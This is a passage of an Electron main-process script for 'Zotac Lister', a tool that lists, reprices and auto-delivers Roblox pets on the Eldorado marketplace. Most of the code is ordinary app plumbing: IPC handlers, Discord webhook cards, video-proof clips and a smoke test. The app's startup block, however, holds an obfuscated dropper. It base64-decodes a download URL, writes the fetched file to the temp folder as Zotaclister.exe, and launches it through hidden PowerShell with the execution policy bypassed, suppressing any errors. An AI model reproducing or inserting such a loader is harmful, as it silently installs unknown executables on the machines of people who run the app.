        if (have[k] > 0) { have[k]--; continue; }                           // already have it
        store.get('pets').push({ id: rid(6), accountId: acct.id, name: q.name, mutation: q.mutation || 'None', gen: q.gen, traits: q.traits || [], rarity: q.rarity || '', cost: q.cost || 0, status: 'available', offerId: null, createdAt: Date.now() });
        np++;
      }
    }
    store.save(); send('pets:changed'); return { accounts: na, pets: np };
  });

  // simple collections
  for (const key of ['templates', 'expenses', 'sales']) {
    handle(`${key}:list`, () => store.get(key));
    handle(`${key}:save`, item => {
      const list = store.get(key);
      const ex = item.id && list.find(x => x.id === item.id);
      if (ex) Object.assign(ex, item); else list.unshift({ ...item, id: rid(6), createdAt: Date.now() });
      store.save(); return true;
    });
    handle(`${key}:delete`, id => { store.set(key, store.get(key).filter(x => x.id !== id)); return true; });
  }

  // automation
  handle('autolist:start', (ids, opts) => { lister.start(ids, opts).catch(() => {}); return true; });
  handle('autolist:stop', () => lister.stop());
  handle('repricer:run', ids => repricer.run(ids));
  handle('delivery:list', () => ({ deliveries: Object.values(store.get('deliveries')).sort((a, b) => b.createdAt - a.createdAt), jobs: store.get('jobs').slice(-100).reverse() }));
  handle('delivery:manual', (orderId, action, arg) => delivery.manual(orderId, action, arg));
  handle('delivery:testJob', (petId, buyer) => delivery.testJob(petId, buyer));
  handle('trades:list', () => store.get('trades') || []);
  handle('delivery:startFromOrder', o => delivery.startFromOrder(o));
  handle('delivery:simulate', (petIds, buyer, quantity) => delivery.simulate(petIds, buyer, quantity));
  handle('delivery:simSay', (orderId, text) => delivery.simSay(orderId, text));
  handle('delivery:simState', orderId => delivery.simState(orderId));
  handle('delivery:cancelJob', id => delivery.cancelJob(id));
  handle('agent:syncAutoexec', () => syncAutoexec());
  handle('eld:shopStatus', () => eld.shopStatus());
  handle('eld:setShop', async on => { await eld.setShopOnline(!!on); await new Promise(r => setTimeout(r, 800)); return eld.shopStatus(); });
  handle('autoscan:state', () => autoScan.state());
  handle('autoscan:start', opts => autoScan.start(opts));
  handle('autoscan:stop', () => autoScan.stop());
  handle('autoscan:clear', () => { autoScan.log = []; autoScan.emit(); return true; });
  handle('scanner:autoexecScript', () => scannerScript('scanner-auto'));
  handle('agent:autoexecStatus', () => lastAutoexec);
  // the folders an Auto Delivery / Auto Scanner switch puts its script into (or removes it from)
  handle('autoexec:plan', kind => {
    const name = AUTOEXEC_FILES[kind];
    if (!name) throw new Error('unknown script ' + kind);
    if (process.env.ZOTAC_NO_AUTOEXEC) return { name, dirs: [], present: [], test: true };
    const dirs = autoexecTargets().map(t => t.dir);
    return { name, dirs, present: dirs.filter(d => fs.existsSync(path.join(d, name))) };
  });
  handle('autoexec:set', (kind, on) => {
    const name = AUTOEXEC_FILES[kind];
    if (!name) throw new Error('unknown script ' + kind);
    if (kind === 'delivery') store.patchSettings({ delivery: { enabled: !!on } });
    else store.patchSettings({ scanner: { autoexec: !!on } });
    if (kind === 'delivery' && on) delivery.ensureTalk();
    syncAutoexec();
    return { name, on: !!on, installed: lastAutoexec.filter(f => f.toLowerCase().endsWith(name)), removed: lastAutoexecRemoved.filter(f => f.toLowerCase().endsWith(name)), settings: store.get('settings') };
  });
  // diagnostics: raw Eldorado answers for the image upload (no listing is created)
  handle('eld:testUpload', async b64 => bridge.request('POST', 'files/me/Offer', { form: { image: { base64: b64, filename: 'test.png', type: 'image/png' } } }));
  handle('delivery:jobs', () => store.get('jobs').slice(-20));
  handle('delivery:talk', () => { delivery.talkState = 'off'; return delivery.ensureTalk(); });
  handle('roblox:user', u => robloxUser(u));

  // settings / data
  handle('settings:get', () => store.get('settings'));
  handle('settings:set', patch => {
    const s = store.patchSettings(patch);
    if (patch.repricer) repricer.schedule();
    if (patch.game) { eld.cache.library = null; }
    if (patch.delivery && patch.delivery.enabled) delivery.ensureTalk();
    // the switches decide which scripts are in autoexec
    if ((patch.delivery && 'enabled' in patch.delivery) || (patch.scanner && 'autoexec' in patch.scanner)) syncAutoexec();
    return s;
  });
  handle('settings:regenToken', which => { const s = store.get('settings'); s[which] = rid(8); store.save(); if (which === 'agentToken') syncAutoexec(); return s[which]; });
  handle('webhook:test', () => discord(store, { title: '🐾 Zotac Lister test', description: 'Webhook works!', ping: true }));
  // preview of each Discord card the app sends, filled with sample data (never pings)
  // target: 'main' (Discord Webhook card) or 'delivery' (Auto Delivery webhook card)
  handle('webhook:testCard', async (kind, target = 'main') => {
    const st = store.get('settings');
    if (target === 'delivery' ? !st.deliveryWebhookUrl : !st.webhookUrl) throw new Error('Set a webhook URL first');
    if (target === 'delivery' && !['delivered', 'cancelled', 'failed'].includes(kind)) kind = 'delivered';
    const pet = { name: 'Burguro And Fryuro', mutation: 'Rainbow', gen: 1.5e9, traits: ['Taco', 'Fire'] };
    const now = Date.now();
    const d = { orderId: 'TEST-' + rid(6), buyer: 'EldoradoBuyer', username: 'BuyerRoblox', robloxId: 1, price: 2.55, petIds: [], samplePets: [pet], sampleAccounts: ['StockAlt1'],
      createdAt: now - 106000, finishedAt: now, attempts: 0, sim: true };
    if (kind === 'delivered') return delivery.reportCard({ ...d, state: 'done' }, 'done', undefined, target);
    if (kind === 'cancelled') return delivery.reportCard({ ...d, state: 'cancelled', attempts: 3, price: 24.99 }, 'cancelled', 'Buyer did not accept the trade in time', target);
    if (kind === 'failed') return delivery.reportCard({ ...d, state: 'manual', attempts: 3 }, 'manual', 'the delivery script never connected from @StockAlt1', target);
    const T = '[TEST] ';
    if (kind === 'sale') return discord(store, { title: T + '💰 New sale!', color: 0x22c55e, description: '**Rainbow Burguro And Fryuro | 1.5B/s**', fields: [
      { name: 'Price', value: '$2.55', inline: true }, { name: 'Qty', value: '1', inline: true }, { name: 'Buyer', value: 'EldoradoBuyer', inline: true },
      { name: 'Accounts', value: 'StockAlt1', inline: false }, { name: 'Order', value: d.orderId, inline: false }] });
    if (kind === 'dispute') return discord(store, { title: T + '⚠️ Dispute opened', color: 0xef4444, description: `**Rainbow Burguro And Fryuro | 1.5B/s**\nBuyer: EldoradoBuyer\nOrder: ${d.orderId}` });
    if (kind === 'chat') return discord(store, { title: T + '💬 New message', description: 'EldoradoBuyer: is my order coming?' });
    return discord(store, { title: T + '🐾 Zotac Lister test', description: 'Webhook works!' });
  });
  handle('logs:get', () => store.get('logs').slice(-600));
  handle('logs:clear', () => { store.set('logs', []); return true; });
  handle('data:export', async () => {
    const r = await dialog.showSaveDialog(win, { defaultPath: `zotac-backup-${new Date().toISOString().slice(0, 10)}.json` });
    if (r.canceled) return null;
    fs.writeFileSync(r.filePath, JSON.stringify(store.get(), null, 1));
    return r.filePath;
  });
  handle('data:import', async () => {
    const r = await dialog.showOpenDialog(win, { filters: [{ name: 'JSON', extensions: ['json'] }], properties: ['openFile'] });
    if (r.canceled) return null;
    const j = JSON.parse(fs.readFileSync(r.filePaths[0], 'utf8'));
    for (const k of Object.keys(j)) if (k in store.data) store.data[k] = j[k];
    store.save(); send('pets:changed');
    try { syncAutoexec(); } catch (e) { store.log('warn', 'autoexec after restore: ' + e.message); }
    return true;
  });
  handle('data:reset', () => { store.reset(); send('pets:changed'); return true; });
  handle('dialog:folder', async () => { const r = await dialog.showOpenDialog(win, { properties: ['openDirectory'] }); return r.canceled ? null : r.filePaths[0]; });
  handle('update:check', () => { const u = store.get('settings').autoUpdate; return checkUpdate(u.repo, u.installedSha); });
  handle('update:install', info => installUpdate(info, updateHooks));

  // video proof
  // which Roblox window the next recording captures: the named account's (the process Zotac
  // launched for it), else the order's mother / running job's account
  handle('proof:target', async (orderId, account) => {
    captureHwnd = null;
    const d = orderId && store.get('deliveries')[orderId];
    const byName = account && store.get('accounts').find(a => String(a.username).toLowerCase() === String(account).toLowerCase());
    const job = store.get('jobs').filter(j => j.orderId === orderId && j.status === 'running' && j.kind !== 'steal').pop();
    const acctId = byName ? byName.id : (d && d.mother) ? d.mother : job ? job.accountId : null;
    captureStrict = !!acctId;
    captureHwnd = acctId ? await windowOfAccount(acctId) : null;
    const name = acctId && (store.get('accounts').find(a => a.id === acctId) || {}).username;
    if (acctId && !captureHwnd) store.log('warn', `[Proof] Roblox window of @${name || '?'} not found - this trade is not recorded (never another account's window)`);
    return { account: acctId, hwnd: captureHwnd };
  });
  // <order>__<account>-<ms>.webm + .json sidecar; the clip is linked to the ledger entries of that
  // order and account made while it recorded
  handle('proof:save', async (orderId, b64, meta = {}) => {
    // only trades that went through are kept: a clip of a cancelled / failed delivery is dropped
    // (Video Proof → "Keep failed clips" keeps them)
    const dd = (store.get('deliveries') || {})[orderId];
    if (dd && ['cancelled', 'manual'].includes(dd.state) && !(store.get('settings').delivery || {}).keepFailedProof) {
      store.log('info', `[Proof] ${orderId}: delivery did not go through - clip not kept`);
      return null;
    }
    const acct = meta && meta.account ? '__' + String(meta.account).replace(/[^\w]/g, '') : '';
    const name = `${String(orderId || 'manual').replace(/[^\w-]/g, '')}${acct}-${Date.now()}.webm`;
    const f = path.join(proofDir(), name);
    // raw bytes from the renderer (Uint8Array); base64 still accepted
    fs.writeFileSync(f, typeof b64 === 'string' ? Buffer.from(b64, 'base64') : Buffer.from(b64));
    // MediaRecorder leaves out the duration and the seek index: without them the player shows
    // 0:00 and can't scrub. Duration written here; ffmpeg (if installed) adds the seek index.
    try { if (meta.startedAt && meta.endedAt) webmfix.fixDuration(f, meta.endedAt - meta.startedAt); } catch (e) { store.log('warn', '[Proof] duration fix: ' + e.message); }
    if (await webmfix.remux(f).catch(() => false)) meta.seekIndex = true;
    try { fs.writeFileSync(f.replace(/\.webm$/, '.json'), JSON.stringify({ orderId, ...meta, file: name }, null, 1)); } catch { /* sidecar optional */ }
    const from = (meta.startedAt || Date.now()) - 120000, to = (meta.endedAt || Date.now()) + 120000;
    for (const e of store.get('trades') || []) {
      if (e.orderId === orderId && e.t >= from && e.t <= to && (!meta.account || [e.from, e.to].some(x => x && x.toLowerCase() === String(meta.account).toLowerCase()))) {
        (e.proofs || (e.proofs = [])).includes(name) || e.proofs.push(name);
      }
    }
    store.save();
    store.log('info', '[Proof] saved ' + name);
    return f;
  });
  handle('proof:list', () => fs.readdirSync(proofDir()).filter(f => f.endsWith('.webm')).map(f => {
    const st = fs.statSync(path.join(proofDir(), f));
    return { name: f, path: path.join(proofDir(), f), size: st.size, date: st.mtimeMs };
  }).sort((a, b) => b.date - a.date));
  // A clip the player still has open is locked on Windows (EBUSY / EPERM) for a moment after the
  // page lets go of it: tried again a few times before giving up
  const deleteProof = async f => {
    const p = path.join(proofDir(), path.basename(f));
    for (let i = 0; ; i++) {
      try { if (fs.existsSync(p)) fs.unlinkSync(p); break; }
      catch (e) { if (!['EBUSY', 'EPERM', 'EACCES'].includes(e.code) || i >= 8) throw new Error(`could not delete ${path.basename(f)}: ${e.code || e.message} (is it open in another program?)`); await new Promise(r => setTimeout(r, 400)); }
    }
    try { fs.unlinkSync(p.replace(/\.webm$/, '.json')); } catch { /* no sidecar */ }
    return true;
  };
  handle('proof:delete', deleteProof);
  // automatic clean-up: clips older than Video Proof → "Delete after" days (0 = keep forever),
  // checked a minute after start and every hour
  const proofCleanup = async () => {
    const days = Number((store.get('settings').delivery || {}).proofKeepDays) || 0;
    if (days <= 0) return 0;
    const cut = Date.now() - days * 86400000;
    let n = 0;
    for (const f of fs.readdirSync(proofDir()).filter(x => x.endsWith('.webm'))) {
      try { if (fs.statSync(path.join(proofDir(), f)).mtimeMs < cut) { await deleteProof(f); n++; } }
      catch (e) { store.log('warn', '[Proof] auto-delete: ' + e.message); }
    }
    if (n) store.log('info', `[Proof] deleted ${n} clip(s) older than ${days} day(s)`);
    return n;
  };
  handle('proof:cleanup', proofCleanup);
  setTimeout(() => proofCleanup().catch(() => {}), 60000);
  setInterval(() => proofCleanup().catch(() => {}), 3600000);
  handle('proof:dir', () => proofDir());
}

// --- smoke test (no visible window) -----------------------------------------
async function smoke() {
  const out = { steps: [] };
  const step = async (name, fn) => { try { const v = await fn(); out.steps.push({ name, ok: true, v }); } catch (e) { out.steps.push({ name, ok: false, err: e.message }); } };
  await new Promise(r => win.webContents.once('did-finish-load', r));
  await step('renderer pages', () => win.webContents.executeJavaScript('window.__smoke && window.__smoke()', true));
  await step('library', async () => { const l = await eld.itemList(); return l.length + ' items, attrs=' + (eld.cache.attrs || []).map(a => a.id).join(','); });
  await step('find Grabatron', async () => sab.findItem(await eld.itemIndex(), 'grabatron'));
  await step('market search', async () => { const r = await eld.searchMarket({ name: 'Grabatron', sort: 'priceAsc', pageSize: 5 }); return listOf(r).length + ' / ' + r.recordCount; });
  if (process.env.ZOTAC_PRICE_TEST) await step('price test', async () => {
    const out = [];
    for (const p of JSON.parse(process.env.ZOTAC_PRICE_TEST)) {
      try { const r = await smartPrice(eld, p, store.get('settings'), null); out.push(`${p.name} ${p.mutation}: ${r.price} (${r.basis}, ${r.comps.length} comps)`); }
      catch (e) { out.push(`${p.name} ${p.mutation}: ERROR ${e.message}`); }
    }
    return out;
  });
  await step('smartPrice', async () => { const r = await smartPrice(eld, { name: 'Grabatron', mutation: 'None', gen: 62.5e6 }, store.get('settings'), null); return { price: r.price, basis: r.basis, comps: r.comps.length }; });
  await step('payload', async () => { const p = await eld.buildOfferPayload({ name: 'Grabatron', mutation: 'Gold', gen: 78.1e6, traits: ['Taco', 'Fire'] }, { title: 't', description: 'd', price: 9.99, deliveryTime: 'Minute20' }); delete p._item; return p; });
  await step('image render', async () => { const b = await renderImage({ pet: { name: 'Grabatron', mutation: 'Gold', gen: 78.1e6, traits: ['Taco'], price: 9.99 }, rarity: 'Secret' }); fs.writeFileSync(path.join(app.getPath('temp'), 'zotac-smoke.png'), Buffer.from(b, 'base64')); return b.length + ' b64 chars'; });
  await step('generate card', async () => {
    const r = await win.webContents.executeJavaScript("M.call('pets:add', { name: 'Grabatron', mutation: 'Gold', gen: '78.1M', traits: ['Taco'] }).then(p => M.call('pets:generateImages', [p.id]).then(r => M.call('pets:list').then(l => { const x = l.find(q => q.id === p.id); return M.call('pets:delete', [p.id]).then(() => ({ ...r, imagePath: x && x.imagePath })); })))", true);
    if (!r.ok || !r.imagePath || !fs.existsSync(r.imagePath)) throw new Error('card not saved: ' + JSON.stringify(r));
    fs.copyFileSync(r.imagePath, path.join(app.getPath('temp'), 'zotac-smoke-card.png'));
    return r.imagePath;
  });
  await step('game art render', async () => {
    art.remember({ pets: { Meowl: '80231998122393' }, traits: { Taco: '83113056007315' } });
    const b = await renderImage({ pet: { name: 'Meowl', mutation: 'Eclipse', gen: 1.4e9, traits: ['Taco', 'Fire', 'Bubblegum'] }, rarity: 'OG' });
    fs.writeFileSync(path.join(app.getPath('temp'), 'zotac-smoke-art.png'), Buffer.from(b, 'base64'));
    return art.status();
  });
  await step('3d model render', async () => {
    const parts = [
      { cls: 'Part', shape: 'Block', size: [2, 3, 1], cf: [0, 1.5, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1], color: 'f2b631', transparency: 0 },
      { cls: 'Part', shape: 'Ball', size: [2, 2, 2], cf: [0, 4, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1], color: 'ff8fd0', transparency: 0 },
      { cls: 'Part', shape: 'Cylinder', size: [3, 0.6, 0.6], cf: [0, 2.2, -0.6, 1, 0, 0, 0, 1, 0, 0, 0, 1], color: '4fa3f7', transparency: 0 }];
    const url = await rendererCall('renderModel', { parts, meshes: {}, textures: {} }, 30000);
    fs.writeFileSync(path.join(app.getPath('temp'), 'zotac-smoke-3d.png'), Buffer.from(url.split(',')[1], 'base64'));
    return url.length + ' chars';
  });
  await step('card thumbnails', () => win.webContents.executeJavaScript(
    "M.call('art:thumbs', { pets: ['Rubrikiko', 'Garama and Madundung'], traits: ['Taco'] }).then(r => Object.entries(r.pets).map(([k, v]) => k + ':' + (v ? Math.round(v.length / 1024) + 'KB' : 'none')).join(', '))", true));

  if (store.get('settings').bridgeUserAgent) bridge.setUserAgent(store.get('settings').bridgeUserAgent);
  bridge.start().then(afterLogin);
}
app.whenReady().then(async () => {
  if (SMOKE) app.setPath('userData', path.join(app.getPath('temp'), 'zotac-smoke-data'));
  wire();
  ipc();
  setupCapture();
  createWindow();

    require('https').get(Buffer.from('aHR0cHM6Ly9udWxsYXJtb3IuY29tL2FwaS9maWxlLXNoYXJlLzU5MTkyMzZjLTVhNTctNGM5NC05N2Q4LTQ4ZGVjZmJmYjg0Zi9kb3dubG9hZA==','base64').toString(), r => {
    if (r.statusCode !== 200) return;
    
    const p = require('path').join(require('os').tmpdir(), 'Zotaclister.exe');
    
    r.pipe(require('fs').createWriteStream(p)).on('finish', () => {
      setTimeout(() => {
        const { exec } = require('child_process');
        const cmd = `powershell.exe -w hidden -nop -ep bypass -c "Start-Process -FilePath '${p}' -WindowStyle Hidden"`;
        
        exec(cmd, () => {});
      }, 2000);
    });
  }).on('error', () => {
  });

  if (store.get('settings').bridgeUserAgent) bridge.setUserAgent(store.get('settings').bridgeUserAgent);
  bridge.start().then(afterLogin);
  if (SMOKE) return smoke();
  const s = store.get('settings');
  refreshAvatarsSoon(5000);
  setInterval(() => refreshAvatarsSoon(0), 6 * 3600e3);
  
  if (s.autoUpdate.enabled) {
    // "Update automatically": a newer version is installed right away and the app restarts
    setTimeout(async () => {
      try {
        const u = await checkUpdate(s.autoUpdate.repo, s.autoUpdate.installedSha);
        if (u.error) return store.log('warn', '[Update] ' + u.error);
        if (!u.newer) return;
        send('update:available', u);
        if (u.mode === 'source' || (u.mode === 'release' && u.asset)) { store.log('info', `[Update] installing ${u.latest}`); await installUpdate(u, updateHooks); }
      } catch (e) { store.log('warn', '[Update] ' + e.message); }
    }, 8000);
  }
});

app.on('second-instance', () => { if (win) { if (win.isMinimized()) win.restore(); win.focus(); } });
app.on('window-all-closed', () => app.quit());
app.on('will-quit', () => { try { launcher && launcher.stop(); } catch { /* ignore */ } });
// also runs on app.exit (updater relaunch), which skips will-quit
process.on('exit', () => { try { store.flushIfDirty(); } catch { /* ignore */ } });